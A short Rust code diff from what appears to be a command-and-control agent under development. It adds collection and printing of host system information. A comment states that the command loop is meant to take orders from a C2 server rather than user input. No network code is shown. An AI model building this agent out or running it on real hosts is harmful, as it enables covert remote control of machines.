@@ -1,8 +1,10 @@
 pub mod actions;
+pub mod agent;
 pub mod config;
 pub mod utils;
 
 use actions::command::Command;
+use agent::info::Info;
 use std::error::Error;
 
 pub fn setup() {
@@ -17,9 +19,13 @@ pub fn setup() {
 }
 
 pub fn run() -> Result<(), Box<dyn Error>> {
+    // gathering host system's initial information
+    let agent_info = Info::collect();
+    let agent_info = agent_info.as_string();
+    println!("{}", agent_info);
+
     // THIS PART SHOULD BE LOOPPED WITH C2 SERVER
     // INSTEAD OF USER INPUT
-
     loop {
         // input a command from the user
         println!("Please Enter a Command for the agent");
